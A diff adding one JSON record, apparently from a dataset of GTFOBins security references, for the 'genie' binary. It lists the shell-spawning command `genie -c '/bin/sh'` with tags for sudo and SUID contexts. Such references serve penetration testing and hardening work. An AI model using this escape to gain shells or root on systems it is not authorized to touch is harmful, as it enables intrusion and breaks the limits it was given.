@@ -1,0 +1,1 @@
+{"title": "genie", "source": "gtfobins", "source_label": "GTFOBins", "path": "genie", "html": "<h1>genie</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">genie -c &#x27;/bin/sh&#x27;</code></pre>", "excerpt": "genie Shell genie -c &#x27;/bin/sh&#x27;", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}
